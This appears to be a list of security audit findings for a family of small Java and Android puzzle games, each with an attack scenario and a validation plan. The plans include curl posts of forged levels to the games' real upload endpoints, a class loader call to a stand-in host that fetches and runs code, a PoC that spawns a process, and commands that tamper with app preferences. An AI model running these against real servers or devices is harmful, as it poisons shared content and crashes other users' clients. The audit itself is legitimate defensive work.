validation_plan: Orphan proof: `grep -rn "extends ApoIO" --include=*.java .` returns zero hits; instantiate an anonymous ApoIo in a harness and call readLevel(true,"http://127.0.0.1:8000/x") against netcat serving junk to confirm the transport opens before any parse - establishing that safety depends entirely on absent subclasses.

title: MD5 helper present in shared library but never invoked (orphaned weak-hash capability)
attack_scenario: Theoretical: in variants that validate levels/highscores with this function, MD5 collisions allow crafting substitute artifacts with matching checksums. In ApoMarc the function is inert, so no attacker action applies.
validation_plan: Run `grep -rn "getMd5Digest" --include=*.java .` - single hit at the definition. Cross-check sibling variants for callers to confirm the shared-component propagation hypothesis.

title: Plain-HTTP level transfer infrastructure inherited from framework, but unreachable in this variant
attack_scenario: If a future variant re-enables applet-mode saving, level bytes (and any URLs handed to writeLevel) would travel unencrypted over HTTP, allowing a network MITM to read/inject level submissions. Today an attacker gains nothing: there is no reachable call site.
validation_plan: Static proof: grep confirms single occurrence of APPLET_LEVEL (definition only) and that all writeLevel/readLevel(URL) invocations in apoMario.* go through overrides forcing local files; runtime proof: run ApoMarioApplet in appletviewer and verify no socket to apo-games.de is opened (tcpdump/lsof) because all IO buttons are hidden/disabled.

title: Applet 'cookie' storage sends name/value pairs to codebase cookies.php over plain HTTP
attack_scenario: MITM reads/modifies persisted game state ('cookies') in flight, or a malicious codebase harvests whatever name/value pairs are stored. Dead code here: no path constructs these calls.
validation_plan: Harness: ApoHelp.saveData(new URL("http://127.0.0.1:8000/"), "progress","level9") while running `nc -l 8000`; observe ASCII 'SET=&name=progress&value=level9' in cleartext. Then grep to reconfirm zero production callers.

title: MD5 helper for highscore/validation-style hashing (unused in this variant)
attack_scenario: Where wired, a cheater generates colliding/crafted solution hashes to submit fake solves; network attacker forges hash+solution pairs since transport is also plaintext (see ApoPongBeat-02). Pure library function here.
validation_plan: Unit test confirms MD5 output format (e.g. getMd5Digest("") == known digest); grep confirms no call sites; mark as latent corpus-wide weakness rather than an active flaw in this build.

title: Level-progress sync to apo-games.de 'cookies.php' over plain HTTP; server response trusted for unlock state
attack_scenario: Applet deployment only (B_APPLET=true is set solely in the ApoRelaxApplet constructor, apoRelax/ApoRelaxApplet.java:28). An on-path attacker (open Wi-Fi, ISP, compromised CDN/DNS for apo-games.de) intercepts the cleartext request to cookies.php and replies with an arbitrary integer, unlocking all levels; likewise they can suppress or forge the SET= progress upload. No authentication or TLS anywhere, and there is no user identity, so responses cannot even be bound to a player.
validation_plan: Map www.apo-games.de to 127.0.0.1 in /etc/hosts, run a plain-HTTP listener logging requests. Launch the applet (or patch ApoConstants.B_APPLET=true before ApoRelaxPanel.init). Observer 1: plaintext request to /apoRelax/cookies.php containing body 'GET=&name=level' (proves no TLS/no integrity). Observer 2: reply with body '11' and confirm the level chooser renders buttons up to level 11 unlocked. Wireshark shows the entire exchange in cleartext.

title: Editor parses arbitrary user-selected image file with ImageIO (extension-only filter, no size/format limits)
attack_scenario: An attacker social-engineers a victim into opening a hostile 'puzzle picture': (a) a decompression-bomb PNG (e.g. 50000x50000) exhausts heap during decode, freezing/crashing the game; (b) on an unpatched JRE, malformed JPEG/PNG chunks targeting known ImageIO CVEs yield client-side code execution. Gain ranges from DoS to RCE depending on the victim's JVM - bounded by the fact that the user must hand-pick the file.
validation_plan: Generate a 60000x60000 all-blue PNG (decompression bomb), press L in the editor and open it: heap climbs hundreds of MB and UI stalls BEFORE any downscale occurs (add a breakpoint/log at ApoImage.java:93 vs ApoRelaxLevelGeneration.getImage:495 to show the cap comes too late). For the parser angle, feed a PNG fuzzed with a known pre-2022 ImageIO CVE sample against a matching old JRE and observe the crash/exception inside ImageIO.read.

title: URLClassLoader-based ApoClassLoader supports loading classes from a remote URL (applet branch) but has no caller in this variant
attack_scenario: Theoretical: if a future/sibling wiring passes an http:// path while running as applet (where the sandbox would normally be the only barrier), getMyClass() fetches and executes bytecode from that host over plaintext HTTP, enabling a network MITM to serve malicious classes. In this variant nothing reaches it.
validation_plan: Verify absence: grep the whole tree for 'new ApoClassLoader' / 'getMyClass' - only the definition matches. To demonstrate the hazard if ever revived: host a jar with an ApoSkunkmanAI subclass on a local HTTP server, call new ApoClassLoader("http://127.0.0.1:8000/","Evil").getMyClass() with B_APPLET=true, watch tcpdump show plaintext GET and the constructor execute.

title: URLClassLoader-based dynamic class instantiation helper present but unwired (theoretical remote/local class loading)
attack_scenario: Theoretical only: were a future maintainer to call new ApoClassLoader("http://evil.example/", "Exploit").getMyClass() with any server-influenced argument (e.g. a downloaded level metadata field), hosting a .class file whose constructor runs arbitrary code would achieve remote code execution in the game process. As shipped, no such caller exists, so an attacker gains nothing through this file alone.
validation_plan: Confirm deadness: grep -rn 'ApoClassLoader' --include='*.java' . returns only its own definition (already done). To demonstrate the latent danger, compile a two-class PoC where a test harness invokes getMyClass() against a directory containing class Exploit{ public Exploit(){Runtime.getRuntime().exec("calc");} } and observe execution - proving that any future call site with remote input becomes RCE.

title: AudioPlayer contains plain-HTTP music fetch branch from apo-games.de, currently dead (BInJAR hardwired true)
attack_scenario: Theoretical as written: were BInJAR flipped to false in a sibling variant running as applet, a MITM on the plain-HTTP connection substitutes an audio file; worst realistic case is malformed-input parser bugs in javax.sound (historically exploitable) plus trivially blockable playback. As shipped, no untrusted bytes reach AudioSystem at all.
validation_plan: Verify deadness: `javap -c` or read line 19 showing 'final boolean BInJAR = true', and confirm the else-branch at lines 66-71 cannot execute. To prove the latent path, reflectively/set BInJAR=false, run in applet mode behind mitmproxy, serve garbage on the requested URL, and observe exceptions from AudioSystem.getAudioInputStream - confirming server-controlled bytes enter javax.sound.

title: Sound loader contains plain-HTTP fetch from apo-games.de behind a permanently-false flag
attack_scenario: If the flag were flipped and applet-deployed, a MITM could serve malformed audio to the javax.sound parser seeking memory-corruption bugs, or track players. Currently impossible: javap shows the constant-folded branch; no network sound path exists.
validation_plan: `javap -c org.apogames.sound.AudioPlayer | grep -A2 ldc` shows only the getResource path; run the desktop game under `lsof -i` and observe zero sockets during menu music playback.

title: Any completed highscore response is treated as success and grants coins
attack_scenario: A local cheater routes the hard-coded HTTP endpoint through a controlled proxy, clicks Upload after reaching the score screen, and answers the POST with `HTTP/1.1 200 OK` and an empty completed body. The response loop executes zero times, save returns true, and the client grants 50 spendable hint coins even though no score was stored.
validation_plan: Intercept save_highscore.php with a local HTTP proxy, return status 200 with Content-Length 0, click Upload, and compare the displayed balance before and after. A 50-coin increase at ApoSimpleGame.java:977 confirms the finding.

title: Unbounded parse of highscore response: malicious server can exhaust client heap
attack_scenario: Attacker controlling the endpoint (or MITM with a slow-drip stream) answers a highscore fetch with gigabytes of '0\n0\nAAAA...' lines; the EDT-independent loader thread allocates until OutOfMemoryError. Gained: client freeze/crash during normal play; combined with finding 01 requires only network position.
validation_plan:
Stub server script streams '1
1
x
' repeated ~10^7 times slowly. Run game, open highscore screen, watch RSS/jconsole heap climb until OutOfMemoryError in ApoHighscore.load. Compare with a 10-entry response (flat memory).

title: Highscore level/username/solution submitted over plain HTTP - to the WRONG game's endpoints (apoNotSoSimple), never called in this variant
attack_scenario: Network attacker (coffee-shop MITM or malicious DNS for apo-games.de) reads usernames/submitted solutions in transit and can serve crafted response lines that populate the game's highscore lists. Not exploitable in ApoPongBeat as shipped because save()/load() are unreachable dead clones.
validation_plan: (1) Dormancy: grep shows no references. (2) Wire behavior: harness calls ApoHighscore.getInstance().load() with DNS pointed at a netcat listener; observe plaintext POST body 'Get=' and confirm the request goes to the apoNotSoSimple path despite running ApoPongBeat.

title: Editable local solved counter unlocks all built-in levels
attack_scenario: A local user with root, app-UID instrumentation, or equivalent access stops the app and changes solved in ApoSnakePref to 999. On restart, setSolved() clamps it to the final level rather than rejecting it, and the chooser permits every built-in level. The gain is local progression cheating only, not code execution or a server-side privilege.
validation_plan: On a rooted test emulator, force-stop the app, locate its ApoSnakePref.xml under the app data directory, and set the solved integer to 999, or use app-UID instrumentation to write the same preference. Relaunch and open the puzzle chooser. Being able to select the final built-in level, while a clean profile permits only the initial level, confirms the trust path.

title: Unauthenticated, unsigned level upload endpoint lets anyone publish content pushed to all players
attack_scenario: An attacker scripts curl --data 'level=<crafted payload>' against save_level.php (endpoint discoverable from any APK string table; the obfuscated path segment 'apoSn4ke' provides no secrecy). Poisoned levels persist server-side and are served to the whole player base on next fetch, enabling the remote-crash scenario of ApoSnake-02 or mass garbage-content injection, with no attribution or revocation mechanism in the protocol.
validation_plan: From a PC: curl -d 'level=ABxxxxxxxxxxxxxxxxxxxxxx' http://www.apo-games.de/apoSn4ke/save_level.php, then curl -d 'Get=' http://www.apo-games.de/apoSn4ke/get_level.php and grep for the submitted string. If the service is dead, reproduce locally by pointing ApoSnakeConstants.java:5-6 at a stub PHP/Flask pair implementing the same contract and replaying the flow from the app.

title: Level-progression flag stored as plain int in SharedPreferences; trivially editable to unlock all levels
attack_scenario: A rooted user (or adb backup, since android:allowBackup is unset and defaults to permissive on relevant APIs) edits ApoSnakePref.xml to '<int name="solved" value="99" />'; on next launch all 29 built-in levels are selectable and marked solved. Purely a cheating vector - no code execution, affects only single-player progression.
validation_plan: On a rooted emulator: adb root; adb shell 'echo "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?><map><int name=\"solved\" value=\"28\" /></map>" > /data/data/net.apogames.aposnake/shared_prefs/ApoSnakePref.xml'; relaunch the app and observe all level-chooser circles unlocked/green in the puzzle chooser screen.

title: Unlocked progression is trusted directly from local preferences
attack_scenario: On a rooted or debuggable device, a player stops the app, changes the solved preference to 29, and restarts it. Level 30 becomes selectable without completing the preceding levels. The gain is confined to cheating progression on that installation and does not itself forge the online leaderboard.
validation_plan: On a rooted or authorized debuggable emulator, stop net.apogames.apoclock, edit shared_prefs/ApoClockPref.xml so solved is 29, restart, and open the puzzle chooser. Confirm that the last built-in level is selectable before any earlier level is completed.

title: Unsigned working-directory levels control win state and point calculation
attack_scenario: A local user replaces levels/easy.bot with a valid one-level file containing a 1x1 ground=0 tile, start=(0,0), direction=2, and menu values 100,0,0. After choosing Game and pressing Go without entering commands, isLevelWin finds no GROUND_ORIGINAL tile and awards 2500 points: 1000 + 100*15. This cheats only the local displayed result.
validation_plan: Write the twelve big-endian integers 1,1,1,0,0,0,0,2,3,100,0,0 as levels/easy.bot in the game's working directory. Launch the desktop game, choose Game, leave all command slots empty, and press Go. Immediate completion with 2500 displayed points confirms that unsigned level data controls scoring.

title: File-controlled goal and finish values can force an immediate local win
attack_scenario: A local cheater creates a structurally valid 15-by-15 .cheat file with one player at (64,64), an overlapping goal whose plus is 100.0, and a matching finish point at the player's center. After loading and starting the level, the user presses the action key once. The goal sets progress to 100 and the next tick records a win. The gain is limited to the local victory/grade and Next UI rendered at _from_jar_ApoCheating/apoCheating/ApoCheatingGamePanel.java:854-949; no server-side score or account impact exists in the reviewed source.
validation_plan: Generate a valid .cheat stream containing a 15-by-15 grid, zero teachers, one player at (64,64) with ID 1, one overlapping goal with plus 100.0, zero extras, and one finish at (75,75) for player 1. Load it, start play, and press Space once. A win overlay and grade on the following game tick confirm the trusted-local-state bypass.

title: Unbounded HTTP response line can exhaust the game heap
attack_scenario: After the victim enters Networkmode, the attacker answers the HTTP request with a continuous, very large sequence of bytes containing no CR or LF. readLine continues growing its in-memory line buffer until the lookup thread or JVM encounters OutOfMemoryError, denying or destabilizing the game process.
validation_plan: Run the packaged game with a small test heap such as -Xmx64m and a controlled HTTP proxy. Configure the proxy to stream bytes indefinitely without a newline for the hard-coded URL, press N, and observe an OutOfMemoryError in the lookup thread, process termination on an exit-on-OOM JVM, or loss of responsiveness. Repeat with a bounded newline-terminated response as the control case.

title: Applet progress can be forged over plain HTTP
attack_scenario: An on-path attacker intercepts the cleartext cookies.php request and returns the single line "11". The client parses it and displays all twelve built-in levels as unlocked, modifying the victim's progression without solving them. The same cleartext channel is used to save progress at ApoRelaxPanel.java:208-218.
validation_plan: Run the applet through a legacy JRE with an intercepting proxy. Return HTTP 200 and body "11\n" for /apoRelax/cookies.php. Open the level chooser and confirm that levels 1-12 are drawn as unlocked. Capturing the request also confirms that no TLS protects the response.

title: Locked levels remain clickable while hidden
attack_scenario: On a fresh game where only level 1 is drawn, a local user clicks the blank coordinate occupied by a hidden later-level button. The unchecked handler starts that locked level, bypassing progression without editing memory, files, or network traffic.
validation_plan: Start with maxLevel 0 and open the chooser. Click approximately (537,362), the center of button index 11 derived from ApoRelaxLevelChooser.java:48-59. Confirm that setGame(11) starts level 12 even though only level 1 was rendered.

title: Local levels file supplies an unchecked negative button index
attack_scenario: A malicious local file contains three big-endian integers: count 1, level 0, stars 3. Parsing succeeds, but entering the level chooser evaluates buttons.get(-1), throwing IndexOutOfBoundsException on the uncaught game loop. In-range fabricated records can likewise mark levels visible at ApoSimpleLevelChooser.java:137-140.
validation_plan: Create a 12-byte `levels` file containing `00 00 00 01 00 00 00 00 00 00 00 03`, start the game, and enter Puzzle then Level Chooser. Confirm IndexOutOfBoundsException from ApoSimpleLevelChooser.java:139 and termination of the ApoSubGame thread.

title: Editable save file can mark built-in puzzles solved without verification
attack_scenario: A local user writes one record containing the built-in level string from ApoSlitherLinkLevels.java:24 and the syntactically valid but empty-edge solution "0404aaaaaaaaaaaaaaaa"; "a" denotes an empty cell at ApoSlitherLinkLevelsHelp.java:13. On restart, the game marks that Easy puzzle solved and increments the displayed completion count without the user solving it.
validation_plan: Use DataOutputStream to create highscore.apo with writeInt(1), writeUTF("0404  32 3     2 0 0"), and writeUTF("0404aaaaaaaaaaaaaaaa"). Launch from that directory and confirm the Easy completion counter is incremented and the first level is shown as solved despite the empty loop.

title: Unbounded save count amplifies into retained preview images
attack_scenario: A local attacker supplies a small save containing thousands of repeated custom records such as level "0101 " and solution "0101a". Duplicates are not filtered in addCustomsLevels at lines 43-49, and each retained helper receives a 200-by-200 ARGB preview at ApoSlitherLinkLevelsHelp.java:10-11 and 254-264. The amplified allocations exhaust the heap before the menu appears.
validation_plan: Generate highscore.apo with writeInt(1000), followed by 1000 pairs of writeUTF("0101 ") and writeUTF("0101a"). Run with -Xmx64m. Confirm OutOfMemoryError during ApoSlitherLinkLevelsHelp.makeSolvedImage or failure to reach the main menu.

title: Zero-record highscore file crashes game initialization
attack_scenario: A local attacker replaces levels/highscore.hig with four zero bytes, or a malicious server/network attacker returns those bytes to the applet. On the next launch, the parser accepts a record count of zero. Menu initialization immediately requests a random level and throws IndexOutOfBoundsException, preventing normal startup.
validation_plan: Back up highscore.hig, replace it with bytes 00 00 00 00, and launch ApoStarzMain from the directory containing levels. Confirm initialization terminates with IndexOutOfBoundsException from ApoStarzHighscore.getRandomLevel() line 104. Repeat in applet mode by serving the same four-byte response.

title: Writable local highscore records have no integrity check
attack_scenario: A local player copies a valid level code from an .ase file and constructs highscore.hig with one DataOutputStream record containing that code, an artificial score such as 1, and a non-empty solution. On launch, the game accepts and displays the fabricated record as its highscore. This affects only the local game; the source does not establish that the desktop value reaches a shared server.
validation_plan: Use a small Java helper with DataOutputStream to write: int 1, writeUTF(valid level code), int 1, and writeUTF("r"). Place the result at levels/highscore.hig, launch the desktop game, select the matching level, and confirm Highscore: 1 and the injected solution are shown.

title: AI class-file length directly controls heap allocation
attack_scenario: An attacker supplies an oversized player/Human.class, such as a 256 MiB file, as purported AI content. Launching the game automatically attempts an equally large contiguous heap allocation before displaying the window. With a smaller maximum heap this throws OutOfMemoryError, which is swallowed by the catch(Throwable) at TutorVolleyClassLoader.java:75-77 and presented as ClassNotFoundException; with a larger heap it causes substantial allocation and file reading before class validation. Player one remains without an AI, and TutorVolleyPlayer.java:194-195 prevents normal play.
validation_plan: On a disposable runnable copy, preserve the original Human.class and create a 268435456-byte player/Human.class, for example with truncate. Launch with a deliberately constrained heap such as -Xmx128m and break at TutorVolleyClassLoader.java:96 or enable JVM allocation/GC recording. Confirm the attempted 268435456-byte array allocation, the ClassNotFoundException path at :75-77, and the absence of a usable player-one AI. Repeating with -Xmx512m should instead show the temporary RSS increase and full read before class-format rejection.

title: Persisted local highscore/progress string parsed without guards: tampering unlocks all levels or permanently crashes startup
attack_scenario: On a rooted device (or via adb backup/restore on builds that permit it): edit /data/data/net.apogames.apoclock/shared_prefs/ApoClockPref.xml, set solved=28 to unlock every puzzle level, or set highscore to '12;' - the latter bricks the app into a startup crash loop that survives restarts until the app's data is cleared.
validation_plan: adb backup the app, unpack with abe, change the 'highscore' string to '12;' and restore; launch and observe immediate force-close with StringIndexOutOfBoundsException at ApoClockHighscoreLocal.java:69 (repeat-crash on relaunch). In a second run set solved=28 and observe all 28 level buttons unlocked/green in the chooser without solving anything.

title: Unescaped caller string concatenated into regex in BitsIO.findFile (crash / ReDoS)
attack_scenario: Two modes: (a) crash - a syntactically invalid pattern fragment such as 'a{{' throws PatternSyntaxException on every loop iteration, killing the game thread; (b) hang - a nested-quantifier pattern like '(a+)+$' matched against long filenames causes catastrophic backtracking, freezing the GL/logic thread (soft DoS). Both require no permissions beyond making findFile receive the crafted string.
validation_plan: Unit test on desktop JVM (same java.util.regex semantics): create temp dir with files 'aaaa...a' (200 chars x50 entries); call new BitsIO().findFile(dir, "(a+)+x", true) after relaxing visibility, measure wall time vs. benign prefix; then call with "a{{" and observe PatternSyntaxException stack trace originating at BitsIO.java:148.

title: Deduplication check substrings every server-provided level string; short/empty entries crash the upload thread
attack_scenario: Attacker plants a degenerate record in the shared level DB (anonymous save_level.php POST of an empty/short value, or truncation introduced by an on-path HTTP modifier). Any player who solves their own editor level and taps 'Upload' thereafter crashes: the dedup scan hits the malformed entry before the POST is issued.
validation_plan: Proxy get_level.php so one 11-line block contains '' as the level line (index i%11==0). In the app, open Editor, build/solve a level (upload button becomes visible after SOLVE succeeds), press Upload; adb logcat shows FATAL EXCEPTION StringIndexOutOfBoundsException originating at MyTreasureUserLevels.isIn.

title: Anonymous, unauthenticated level-submission protocol (no identity, signature, or rate limiting in client)
attack_scenario: curl -d 'level=<anything>' http://www.apo-games.de/myTreasure/save_level.php inserts arbitrary records that are pushed to every client by get_level.php. This is the amplifier that makes findings 02 and 03 remotely exploitable without any network position: one scripted request poisons the shared catalog for all players. It also permits catalog flooding/griefing. (Honest caveat: the missing auth is ultimately a server property; here we can only prove the client neither sends nor requires credentials.)
validation_plan: tcpdump/mitmproxy a legitimate in-game upload to capture the exact request shape; replay it with curl using an arbitrary level string; reopen the user-levels screen in the app and confirm the forged entry is listed and selectable (pair with the '9999' payload from finding 02 to demonstrate end-to-end impact).

title: Crafted level start point indexes tile grid out of bounds during render
attack_scenario: Attacker supplies a syntactically valid .bot whose grid is 10x10 but whose start point is (999999, 999999) or negative. Game accepts the level silently, then throws ArrayIndexOutOfBoundsException on first render; in applet mode this kills the applet, on desktop the game window stops functioning. Pure client-side crash, no privilege gain.
validation_plan: Generate a minimal valid .bot (one 10x10 level, all GROUND_EMPTY) but overwrite the two start-point ints after the tile data with 0x000186A0 (100000). Load via gameLoad; confirm console ArrayIndexOutOfBoundsException originating at apoBot.ApoBotComponent.renderPlayer.

title: Unvalidated entity coordinates/tile indices from level file cause out-of-bounds array access and uncaught game crash
attack_scenario: Attacker takes a legitimate .cheat, changes one stored goal coordinate from e.g. 100.0 to 1000000.0 (plain DataOutputStream edit), and shares it. On load, setHands computes x=31250, the guard passes (x-1>=0), and aPlayground[y][x-1] throws ArrayIndexOutOfBoundsException. The exception propagates out of load() on the EDT/startup thread and kills the game. Same result in-game via player start coordinates (movePlayer/isThrowCoin).
validation_plan: Write a valid minimal level with ApoCheatingLoadSave.writeLevel(), then rewrite only the first goal x-coordinate as 1000000 (double at its recorded offset). Open it via the Load button. Expected: ArrayIndexOutOfBoundsException at ApoCheatingGamePanel.setHands, game window dead/closed; confirm same with a player x of 1e9 hitting movePlayer after pressing Play.

title: ObjectInputStream wrapped over untrusted level files establishes a latent deserialization sink (no readObject today)
attack_scenario: Theoretical: if a maintainer (or a cloned sibling variant reusing this LoadSave skeleton) later stores richer objects and calls in.readObject() - the natural next step given the stream is already an ObjectInputStream - any class on the game's classpath becomes a gadget candidate for remote code execution via a booby-trapped level file. Today the worst an attacker gets is the crash paths in ApoCheating-01/02.
validation_plan: Confirm absence mechanically: rg 'readObject' over the tree returns no hits, while ObjectInputStream appears at lines 15, 350, 368 of ApoCheatingLoadSave.java. To demonstrate the latent hazard, append a call to in.readObject() in a test copy and feed a serialized java.util.HashMap containing a common gadget payload - it would instantiate - then revert; this documents why the wrapper choice matters for clone propagation.

title: Hand-rolled XML highscore parser consumes unauthenticated plain-HTTP response: client DoS and on-screen content spoofing
attack_scenario: Attacker controls daporius.drition.net DNS/host or sits on-path (cleartext HTTP, so any LAN/WiFi/gateway MITM works): (a) serve '<person><nickname>a</nickname><level>zzz</level>' -> Integer.parseInt('zzz') throws NumberFormatException, or '<person>' with no '</person>' -> substring(idx,-1) throws StringIndexOutOfBoundsException; the exception escapes think() (ApoDefenceGame.java:405/431) into ApoDefenceTimer.run(), killing the java.util.Timer thread -> game freezes. (b) serve well-formed rows with nickname 'PWNED' mapped to the victim's current map -> fake leaderboard rows are painted, highlighted red as the player's own placement.
validation_plan: Add '127.0.0.1 daporius.drition.net' to /etc/hosts, run python3 -m http.server 80 serving highscore.xml containing '<person><nickname>x</nickname><level>NaN</level></person>'; play Original_First until win/loss screen; observed result: NumberFormatException stack trace and permanently frozen game loop (timer thread dead). Repeat with valid XML using nickname PWNED/map Original_First to confirm spoofed red-highlighted leaderboard row renders.

title: Level-file header ints drive unbounded allocations (new int[y][x], BufferedImage(x*32,y*32), count-driven object loops)
attack_scenario: Attacker distributes an attractive 'custom map' .defence whose first 8 bytes are 0x3B9AC9FF twice (or simply 2000000000/-1): victim opens it via Load -> immediate NegativeArraySizeException/OOME crash; a subtler file (e.g. 60000x60000) passes int[] allocation attempts and dies allocating the 1.92M-pixel-x32 BufferedImage, or declares enemyWay size 0x7FFFFFFF so the loop at 177-183 exhausts heap from a ~30-byte file.
validation_plan: Write a file: bytes 0-7 big-endian 1000000000,1000000000, append junk, save as evil.defence; launch game, Options->Load, select evil.defence; observed result: NegativeArraySizeException (negative variant) or OutOfMemoryError (large variant) with ApoDefenceLoadSave.readLevel in the trace. Second file with enemyWay-size field 0x7FFFFFFF confirms heap exhaustion from a tiny file.

title: UTF string from level file used as classpath resource name for underground image - reliable crash, but no filesystem traversal
attack_scenario: Craft a .defence with imageString '/images/nope.png': on load the game throws IllegalArgumentException/NPE during restart() and dies - a second crash vector bundled with the same malicious-level distribution as ApoDefence-03. IMPORTANT negative result: '../../etc/passwd' style values do NOT escape the classpath (getResource never resolves arbitrary filesystem/remote paths here), so this is not a file-disclosure bug; marking that angle explicitly unreachable/theoretical.
validation_plan: Take a working Original_First.defence, locate the writeUTF imageString segment ('/images/underground.png' visible as readable string), replace with '/images/zz.png' keeping lengths consistent; open via Load; observed result: IllegalArgumentException ('input == null!') or NPE at ApoDefenceImage.java:108 immediately after selection. Try '../../../etc/passwd' to confirm it also merely crashes (null resource), proving no traversal.

title: Uncaught IndexOutOfBounds on death when highscore list has fewer than 2 entries: remote crash of game thread
attack_scenario: Attacker who can answer the client's HTTP request returns e.g. a single entry ('100\n50\nAlice'). The victim plays until their inevitable first death; instead of the game-over dialog, an unhandled IndexOutOfBoundsException kills the game loop and the window hangs. Same crash occurs benignly whenever the online highscore cannot be fetched. Attacker gains reliable denial of the running session; no persistence or code execution.
validation_plan: Rehost the endpoints (hosts file): stub get_highscore.php to return exactly '100\n50\nAlice'. Play until death. Observe stack trace IndexOutOfBoundsException at ApoJumpLevel.isFirstPosition and a frozen, non-responsive game frame. Control: return two entries and death proceeds normally.

title: Hand-rolled level parser performs unchecked length/geometry arithmetic on server-controlled level strings, crashing the game thread
attack_scenario: 1) Attacker MITMs get_level.php (see ApoImp-01) and returns numeric metadata plus a level line of 100 characters. On 'userlevels' play, (100/14+2)*2=18 rows are allocated but the parse loop reads up to index 111 -> StringIndexOutOfBoundsException in loadLevel, uncaught -> ApoSubGame thread dies, window freezes. 2) Alternatively a syntactically fitting level with no '4' goal tile leaves goalX/goalY=-1 and the first think() tick hits level[-1][-1] at line 476 -> ArrayIndexOutOfBoundsException. Impact is reliable client-side denial of service of the game process's logic thread; no code execution.
validation_plan: Stub get_level.php with: integer filler lines plus one level line of exactly 100 chars of '1'. Start game, press the userlevels button; console shows StringIndexOutOfBoundsException from apoImp.game.ApoImpGame.loadLevel and the game stops updating (thread death). Repeat with a 196-char grid containing no '4' to trigger the AIOOBE at line 476 on the first tick.

title: Shared-level upload endpoint trusts the client completely (no auth, no validation, raw content relay)
attack_scenario: A user (or MITM replaying the form-urlencoded POST) floods the shared level database with garbage or oversized strings; other clients auto-download them at startup (ApoImp-01) and parse them (ApoImp-02), so a single poisoned upload griefs every player's level browser and can freeze their game threads. Gained: vandalism/DoS of the community content channel; no per-user accountability.
validation_plan: curl -X POST -d 'level=00000000000000...' http://www.apo-games.de/apoElf/save_level.php and then reload the in-game userlevels list (restart client or click upload flow) to confirm the injected entry appears; demonstrates the endpoint accepts unauthenticated arbitrary content. (Live-endpoint test only if the server still exists; otherwise reproduce against a local stub.)

title: Unbounded line-by-line ingestion of server responses into memory lists
attack_scenario: Attacker answering get_level.php streams ~1 GB of '1' lines; the game (which fetches automatically on launch) allocates until heap exhaustion, degrading or killing the client. Gained: reliable client resource exhaustion from a network position.
validation_plan: Point www.apo-games.de at a netcat/python stub that emits '1\n' forever after consuming the POST body; launch the game with -Xmx256m and watch RSS climb until OutOfOfMemoryError appears on the userlevel loader thread.

title: Unvalidated width/height integers from hand-parsed .mar level file drive giant array allocation (OOM crash)
attack_scenario: Attacker shares a '.mar level' whose first 8 bytes encode width=height=0x7FFFFFF0. Victim loads it in the editor; the JVM attempts a ~2^60-element reference array, throws OutOfMemoryError, and the game dies (or hangs thrashing GC with moderately large values like 20000x20000 while allocating per-tile BufferedImages in makeWall/makeGroundWall).
validation_plan: Create mar.bin with DataOutputStream.writeInt(Integer.MAX_VALUE-15) twice plus a few trailing ints; rename to evil.mar; Editor > Load level; observe immediate OutOfMemoryError on console / process death. Compare with width=100,height=15 control file which loads normally.

title: Replay-header width/difficulty reused unvalidated to size level arrays and scale enemy-generation loops
attack_scenario: Attacker posts a 'world record' .rep with width=2000000000. On load, makeLevel attempts a 15x2e9 entity array -> OutOfMemoryError, game crashes; with width=100000 the game instead freezes for minutes building tiles/enemies. Same file also poisons the level-name line consumed by ApoMario-04.
validation_plan: Write evil.rep with lines: '2000000000','50','-1', then filler name/author/steps lines; Menu > Load Replay; observe OOM. Second file with '5000','700000','-1',... demonstrates multi-minute hang in level generation (sample with jstack showing ApoMarioRandomLevel.makeRandomLevel frames).

title: Server-controlled highscore lists parsed without cross-validation; misaligned data breaks client state
attack_scenario: MITM returns N level-lines but fewer username-lines: sort() throws IndexOutOfBoundsException at line 102, the catch in load() (lines 60-62) sets this.highscore = null, and the next click on the 'User Levels' menu item (ApoNotSoSimplePanel.setUserGame, line 161 -> getLevel line 112) dereferences the null field, throwing NullPointerException into the AWT event thread; the user-level feature stays broken for the session. Alternatively a truncated level token stream aborts parsing (caught by catch(Throwable) at line 148, returning null) so a hostile server can selectively make user levels unusable. Impact is confined to client-side denial of service / feature breakage - no memory unsafety, and instruction strings are drawn via Graphics.drawString (ApoNotSoSimpleLevel.java:386), not interpreted.
validation_plan: Proxy get_highscore.php and reply with 10 groups where the username lines are omitted (only 50 lines total, i%5 mapping skewed). Launch the game, click 'UserLevels': console shows java.lang.IndexOutOfBoundsException from ApoNotSoSimpleUserLevels.sort line 102 followed by NullPointerException from getLevel, and the menu does nothing - confirming the path end-to-end.

title: Unvalidated level ids from local 'levels' progress file used as ArrayList index (crash / unlock cheat)
attack_scenario: (a) Tamper: edit 'levels' to contain level=1000000000; opening the level chooser throws IndexOutOfBoundsException on the game thread (no catch in ApoSubGame.run), freezing/killing the client. (b) Cheat: conversely, entries with level=1..N and stars=3 unlock every level and maximize star-based coin payouts granted in setLevelSolved/addLevel (ApoSimplePanel.java:716-718, ApoSimpleLevelChooser.java:224-241) without playing.
validation_plan: Create 'levels' containing writeInt(1), writeInt(2000000000), writeInt(3) via DataOutputStream; launch and click through to the level chooser: console prints IndexOutOfBoundsException at ApoSimpleLevelChooser.setVisibleButtons and the screen never renders. Replace the id with 90 and stars 3 to confirm full unlock and coin grant on the next win tick.

title: Progress 'achievements' cookie exchanged with apo-games.de cookies.php over plain HTTP
attack_scenario: (1) Player runs the applet build (B_APPLET=true, set in ApoSimpleSudokuApplet.java:26 / ApoScreen.initApplet():162). On the level-chooser screen the client GETs cookies.php and later uploads solved-level IDs. (2) An on-path attacker (open WiFi, malicious ISP) or whoever controls/resolves www.apo-games.de (the domain is long-dead; no TLS, no pinning, so DNS hijack or expired-domain registration works outright) replies with e.g. '0,1,2,...,30,' and forges the player's solved-level record, or logs the upload to profile gameplay progress. Impact is bounded: solvedLevels only paints overlay circles in the chooser (render(), LevelChooser.java:277-283) - every level button is clickable regardless (mouseReleased(), lines 217-228) - so this is record/privacy tampering, not an unlock.
validation_plan: Flip the applet path on (launch ApoSimpleSudokuApplet, or set ApoConstants.B_APPLET=true before init), map www.apo-games.de to 127.0.0.1 in /etc/hosts, run `nc -l 80` or a logging Python http.server. Open the level chooser: observe the raw request containing 'GET=&name=apoSudoku_level' in cleartext; answer with '0,1,2,' and observe red overlays on levels 1-3 - proving both the transport exposure and that server bytes become client game state.

title: Hand-rolled 'connected' chain-string parser has no length/digit/range validation (currently fed only by compile-time literals)
